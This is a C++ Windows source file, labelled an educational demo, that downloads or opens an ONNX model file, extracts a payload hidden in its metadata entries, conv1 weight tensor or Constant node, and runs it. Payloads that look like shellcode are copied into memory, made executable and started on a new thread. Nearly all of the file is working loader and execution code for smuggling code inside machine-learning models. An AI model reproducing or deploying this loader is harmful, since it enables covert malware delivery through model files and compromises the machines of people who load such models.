// WinML Payload Loader & Trigger - educational demo only.
// Build (VS 2022): cl.exe /EHsc /std:c++17 /O2 /MT winml_loader.cpp /Fe:loader.exe
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <exception>
#include <fstream>
#include <functional>
#include <iostream>
#include <map>
#include <string>
#include <vector>

#include <winrt/base.h>
#include <winrt/Windows.Foundation.h>
#include <winrt/Windows.AI.MachineLearning.h>
#include <winrt/Windows.Storage.h>
#include <winrt/Windows.Storage.Streams.h>

#pragma comment(lib, "windowsapp")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "RuntimeObject")

using namespace winrt;
using namespace winrt::Windows::AI::MachineLearning;
using namespace winrt::Windows::Storage;
using namespace winrt::Windows::Storage::Streams;

namespace pb {
    static uint64_t read_varint(const uint8_t* data, size_t& pos, size_t len) {
        uint64_t result = 0;
        int shift = 0;
        while (pos < len && shift < 64) {
            uint8_t b = data[pos++];
            result |= (uint64_t)(b & 0x7F) << shift;
            if ((b & 0x80) == 0) break;
            shift += 7;
        }
        return result;
    }

    struct Field {
        uint32_t number;
        uint8_t wire_type;
        uint64_t varint_val;
        std::vector<uint8_t> bytes_val;
    };

    static bool next_field(const uint8_t* data, size_t& pos, size_t len, Field& f) {
        if (pos >= len) return false;
        uint64_t tag = read_varint(data, pos, len);
        if (tag == 0 && pos > len) return false;
        f.number = (uint32_t)(tag >> 3);
        f.wire_type = (uint8_t)(tag & 7);
        switch (f.wire_type) {
        case 0: f.varint_val = read_varint(data, pos, len); break;
        case 2: {
            uint64_t n = read_varint(data, pos, len);
            if (n > len - pos) return false;
            f.bytes_val.assign(data + pos, data + pos + n);
            pos += (size_t)n;
            break;
        }
        case 5: if (len - pos < 4) return false; pos += 4; break;
        case 1: if (len - pos < 8) return false; pos += 8; break;
        default: return false;
        }
        return true;
    }
}

static std::string DecodeBase64(const std::string& input) {
    DWORD outLen = 0, skip = 0, flags = 0;
    if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, &skip, &flags))
        return {};
    std::string out(outLen, '\0');
    if (outLen == 0) return out;
    if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64,
                              reinterpret_cast<BYTE*>(out.data()), &outLen, &skip, &flags))
        return {};
    out.resize(outLen);
    return out;
}

static bool TryReadInt64FromRawData(const std::vector<uint8_t>& raw, int64_t& value) {
    if (raw.size() < sizeof(int64_t)) return false;
    std::memcpy(&value, raw.data(), sizeof(int64_t));
    return true;
}

static std::vector<uint8_t> ExtractPayloadFromMetadata(const std::vector<uint8_t>& modelBytes) {
    std::map<int, std::string> chunks;
    size_t pos = 0;
    pb::Field f;
    while (pb::next_field(modelBytes.data(), pos, modelBytes.size(), f)) {
        if (f.number != 14 || f.wire_type != 2) continue;
        size_t ep = 0;
        pb::Field ef;
        std::string key, val;
        while (ep < f.bytes_val.size() &&
               pb::next_field(f.bytes_val.data(), ep, f.bytes_val.size(), ef)) {
            if (ef.number == 1) key.assign(ef.bytes_val.begin(), ef.bytes_val.end());
            if (ef.number == 2) val.assign(ef.bytes_val.begin(), ef.bytes_val.end());
        }
        if (key.rfind("weight_hash_", 0) == 0)
            chunks[std::stoi(key.substr(12))] = val;
    }
    std::string b64;
    for (const auto& kv : chunks) b64 += kv.second;
    if (b64.empty()) return {};
    std::string raw = DecodeBase64(b64);
    return std::vector<uint8_t>(raw.begin(), raw.end());
}

static std::vector<uint8_t> ExtractPayloadFromWeights(const std::vector<uint8_t>& modelBytes) {
    std::vector<uint8_t> weightRaw, biasRaw;
    std::function<void(const std::vector<uint8_t>&, int)> scan =
        [&](const std::vector<uint8_t>& graphBytes, int depth) {
        if (depth > 3) return;
        size_t gp = 0;
        pb::Field gf;
        while (pb::next_field(graphBytes.data(), gp, graphBytes.size(), gf)) {
            if (gf.number == 5 && gf.wire_type == 2) {
                size_t tp = 0;
                pb::Field tf;
                std::string name;
                std::vector<uint8_t> raw;
                while (tp < gf.bytes_val.size() &&
                       pb::next_field(gf.bytes_val.data(), tp, gf.bytes_val.size(), tf)) {
                    if (tf.number == 8 && tf.wire_type == 2)
                        name.assign(tf.bytes_val.begin(), tf.bytes_val.end());
                    else if (tf.number == 9 && tf.wire_type == 2)
                        raw = tf.bytes_val;
                }
                if (name == "conv1.weight") weightRaw = raw;
                else if (name == "conv1.bias") biasRaw = raw;
            }
            if (gf.number == 1 && gf.wire_type == 2 && depth < 2) {
                size_t np_ = 0;
                pb::Field nf;
                while (pb::next_field(gf.bytes_val.data(), np_, gf.bytes_val.size(), nf)) {
                    if (nf.number != 4 || nf.wire_type != 2) continue;
                    size_t ap = 0;
                    pb::Field af;
                    while (pb::next_field(nf.bytes_val.data(), ap, nf.bytes_val.size(), af))
                        if (af.number == 4 && af.wire_type == 2)
                            scan(af.bytes_val, depth + 1);
                }
            }
        }
    };
    size_t pos = 0;
    pb::Field f;
    while (pb::next_field(modelBytes.data(), pos, modelBytes.size(), f))
        if (f.number == 7 && f.wire_type == 2) { scan(f.bytes_val, 0); break; }
    if (weightRaw.empty()) return {};
    int64_t len = 0;
    if (!TryReadInt64FromRawData(biasRaw, len) || len <= 0 || (size_t)len > weightRaw.size())
        len = (int64_t)weightRaw.size();
    return std::vector<uint8_t>(weightRaw.begin(), weightRaw.begin() + len);
}

static std::vector<uint8_t> ExtractPayloadFromConstant(const std::vector<uint8_t>& modelBytes) {
    std::vector<uint8_t> best, named;
    std::function<void(const std::vector<uint8_t>&, int)> scan =
        [&](const std::vector<uint8_t>& graphBytes, int depth) {
        if (depth > 4) return;
        size_t gp = 0;
        pb::Field gf;
        while (pb::next_field(graphBytes.data(), gp, graphBytes.size(), gf)) {
            if (gf.number != 1 || gf.wire_type != 2) continue;
            size_t np_ = 0;
            pb::Field nf;
            std::vector<std::vector<uint8_t>> attrs;
            while (pb::next_field(gf.bytes_val.data(), np_, gf.bytes_val.size(), nf))
                if (nf.number == 5 && nf.wire_type == 2)
                    attrs.push_back(nf.bytes_val);
            for (auto& attr : attrs) {
                size_t ap = 0;
                pb::Field af;
                uint64_t type = 0;
                std::vector<uint8_t> tMsg, gMsg;
                while (pb::next_field(attr.data(), ap, attr.size(), af)) {
                    if (af.number == 20) type = af.varint_val;
                    else if (af.number == 5 && af.wire_type == 2) tMsg = af.bytes_val;
                    else if (af.number == 6 && af.wire_type == 2) gMsg = af.bytes_val;
                }
                if (!gMsg.empty()) { scan(gMsg, depth + 1); continue; }
                if (type != 4 || tMsg.empty()) continue;
                size_t tp = 0;
                pb::Field tf;
                std::string name;
                std::vector<uint8_t> raw;
                while (pb::next_field(tMsg.data(), tp, tMsg.size(), tf)) {
                    if (tf.number == 8) name.assign(tf.bytes_val.begin(), tf.bytes_val.end());
                    else if (tf.number == 9) raw = tf.bytes_val;
                }
                if (raw.empty()) continue;
                if (name == "const.payload") named = raw;
                else if (raw.size() > best.size()) best = raw;
            }
        }
    };
    size_t pos = 0;
    pb::Field f;
    while (pb::next_field(modelBytes.data(), pos, modelBytes.size(), f))
        if (f.number == 7 && f.wire_type == 2) { scan(f.bytes_val, 0); break; }
    return named.empty() ? best : named;
}

// ---- payload classification -----------------------------------------------
static double shannon_entropy(const std::vector<uint8_t>& b) {
    if (b.empty()) return 0.0;
    size_t count[256]{};
    for (uint8_t v : b) count[v]++;
    double ent = 0.0;
    double n = static_cast<double>(b.size());
    for (size_t c : count) {
        if (!c) continue;
        double p = c / n;
        ent -= p * (std::log(p) / std::log(2.0));
    }
    return ent;
}

static double printable_ratio(const std::vector<uint8_t>& b) {
    if (b.empty()) return 0.0;
    size_t printable = 0;
    for (uint8_t v : b)
        if ((v >= 32 && v < 127) || v == 9 || v == 10 || v == 13) printable++;
    return static_cast<double>(printable) / b.size();
}

static bool is_utf8_text(const std::vector<uint8_t>& b) {
    return !b.empty() && printable_ratio(b) > 0.90;
}

static bool has_shellcode_sig(const std::vector<uint8_t>& b) {
    if (b.size() < 4) return false;
    static const uint8_t sigs[][4] = {
        {0x55, 0x8B, 0xEC, 0x00},       // push ebp; mov ebp, esp
        {0x48, 0x89, 0xE5, 0x00},       // mov rbp, rsp
        {0xFC, 0x48, 0x83, 0xE4},       // cld; and rsp, -16
    };
    for (auto& s : sigs)
        if (std::memcmp(b.data(), s, 3) == 0) return true;
    return false;
}

static bool looks_encrypted(const std::vector<uint8_t>& b) {
    return b.size() >= 16 && b.size() % 4 == 0 && shannon_entropy(b) > 7.5;
}

static bool is_random_weight(const std::vector<uint8_t>& b) {
    if (b.size() < 256 || b.size() % 4 != 0) return false;
    size_t total = b.size() / 4;
    size_t inRange = 0;
    for (size_t i = 0; i < total; ++i) {
        float v;
        std::memcpy(&v, b.data() + i * 4, 4);
        if (!std::isfinite(v)) return false;
        if (v >= -1.0f && v <= 1.0f) inRange++;
    }
    // random uniform bytes read as floats land in [-1,1] ~30% of the time;
    // real weight distributions are >90%.
    return static_cast<double>(inRange) / total > 0.5 &&
           printable_ratio(b) < 0.15 &&
           shannon_entropy(b) > 7.5;
}

// ---- execution -------------------------------------------------------------

static void ExecuteShellcode(const std::vector<uint8_t>& payload) {
    if (payload.empty()) return;
    LPVOID mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;
    RtlMoveMemory(mem, payload.data(), payload.size());
    DWORD oldProtect;
    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &oldProtect);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

static void ExecuteText(const std::vector<uint8_t>& payload) {
    std::string text(payload.begin(), payload.end());
    std::printf("--- payload text (%zu bytes) ---\n%s\n--- end ---\n", payload.size(), text.c_str());
}

static void DispatchPayload(const std::vector<uint8_t>& payload) {
    if (is_utf8_text(payload))      { std::printf("[*] classified: utf8_text -> print only\n");       ExecuteText(payload); }
    else if (has_shellcode_sig(payload)) { std::printf("[*] classified: shellcode -> execute\n");     ExecuteShellcode(payload); }
    else if (looks_encrypted(payload))   { std::printf("[!] classified: encrypted blob, no key - skip\n"); }
    else if (is_random_weight(payload))  { std::printf("[!] classified: random weight decoy - skip\n"); }
    else                                 { std::printf("[!] classified: unknown form - skip\n"); }
}

// ---- model loading ---------------------------------------------------------

static std::vector<uint8_t> LoadModelFromFile(const std::wstring& path) {
    std::ifstream ifs(path, std::ios::binary);
    if (!ifs) throw std::runtime_error("cannot open model file");
    ifs.seekg(0, std::ios::end);
    std::streamoff size = ifs.tellg();
    ifs.seekg(0, std::ios::beg);
    std::vector<uint8_t> buf((size_t)size);
    if (size > 0) {
        ifs.read(reinterpret_cast<char*>(buf.data()), size);
        if (!ifs) throw std::runtime_error("failed to read model file");
    }
    return buf;
}

static std::vector<uint8_t> LoadModelFromUrl(const std::wstring& url) {
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256]{}, path[2048]{};
    uc.lpszHostName = host;  uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path;  uc.dwUrlPathLength = _countof(path);
    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.size(), 0, &uc))
        throw std::runtime_error("WinHttpCrackUrl failed");

    HINTERNET hSession = WinHttpOpen(L"onnx-loader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) throw std::runtime_error("WinHttpOpen failed");

    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); throw std::runtime_error("WinHttpConnect failed"); }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); throw std::runtime_error("WinHttpOpenRequest failed"); }

    std::vector<uint8_t> result;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD available = 0;
        do {
            if (!WinHttpQueryDataAvailable(hRequest, &available)) break;
            if (available == 0) break;
            size_t offset = result.size();
            result.resize(offset + available);
            DWORD read = 0;
            if (!WinHttpReadData(hRequest, result.data() + offset, available, &read)) {
                result.resize(offset);
                break;
            }
            result.resize(offset + read);
        } while (available > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

static void TriggerWinMLLoad(const std::vector<uint8_t>& modelBytes) {
    try {
        winrt::init_apartment();
        wchar_t tmpPath[MAX_PATH]{}, tmpFile[MAX_PATH]{};
        if (GetTempPathW(MAX_PATH, tmpPath) == 0) throw std::runtime_error("GetTempPathW failed");
        if (GetTempFileNameW(tmpPath, L"onx", 0, tmpFile) == 0) throw std::runtime_error("GetTempFileNameW failed");
        {
            HANDLE hf = CreateFileW(tmpFile, GENERIC_WRITE, 0, nullptr,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) throw std::runtime_error("CreateFileW failed");
            if (!modelBytes.empty()) {
                DWORD written = 0;
                WriteFile(hf, modelBytes.data(), (DWORD)modelBytes.size(), &written, nullptr);
            }
            CloseHandle(hf);
        }
        auto file = StorageFile::GetFileFromPathAsync(tmpFile).get();
        auto streamRef = RandomAccessStreamReference::CreateFromFile(file);
        LearningModel model = LearningModel::LoadFromStream(streamRef);
        std::wcout << L"[+] WinML loaded model: " << model.Name().c_str() << std::endl;
        DeleteFileW(tmpFile);
    } catch (const winrt::hresult_error& ex) {
        std::wcout << L"[-] WinML exception: " << ex.message().c_str() << std::endl;
    } catch (const std::exception& ex) {
        std::printf("[-] WinML std::exception: %s\n", ex.what());
    }
}

static void PrintUsage(const wchar_t* argv0) {
    std::wprintf(L"Usage:\n");
    std::wprintf(L"  %s <model.onnx> [metadata|weights|constant|auto]\n", argv0);
    std::wprintf(L"  %s --url https://host/path/model.onnx [metadata|weights|constant|auto]\n", argv0);
    std::wprintf(L"\nEducational demo for ONNX supply-chain security.\n");
}

int wmain(int argc, wchar_t* argv[]) {
    winrt::init_apartment();
    if (argc < 2) { PrintUsage(argv[0]); return 1; }

    std::wstring source, method = L"weights";
    bool fromUrl = false;
    if (std::wstring(argv[1]) == L"--url") {
        if (argc < 3) { PrintUsage(argv[0]); return 1; }
        source = argv[2];
        fromUrl = true;
        if (argc >= 4) method = argv[3];
    } else {
        source = argv[1];
        if (argc >= 3) method = argv[2];
    }

    try {
        std::vector<uint8_t> modelBytes = fromUrl ? LoadModelFromUrl(source) : LoadModelFromFile(source);
        std::wprintf(L"[+] Model bytes: %zu B\n", modelBytes.size());
        if (modelBytes.empty()) throw std::runtime_error("empty model bytes");

        std::wprintf(L"[*] Triggering WinML load...\n");
        TriggerWinMLLoad(modelBytes);

        std::vector<uint8_t> payload;
        if (method == L"metadata")     payload = ExtractPayloadFromMetadata(modelBytes);
        else if (method == L"weights") payload = ExtractPayloadFromWeights(modelBytes);
        else if (method == L"constant") payload = ExtractPayloadFromConstant(modelBytes);
        else {
            payload = ExtractPayloadFromConstant(modelBytes);
            if (payload.empty()) payload = ExtractPayloadFromWeights(modelBytes);
            if (payload.empty()) payload = ExtractPayloadFromMetadata(modelBytes);
        }
        std::wprintf(L"[+] Extracted payload: %zu B\n", payload.size());
        if (payload.empty()) { std::wprintf(L"[-] No payload found.\n"); return 2; }

        DispatchPayload(payload);
        std::wprintf(L"[+] Done.\n");
    } catch (const std::exception& ex) {
        std::fprintf(stderr, "[-] Error: %s\n", ex.what());
        return 3;
    }
    return 0;
}
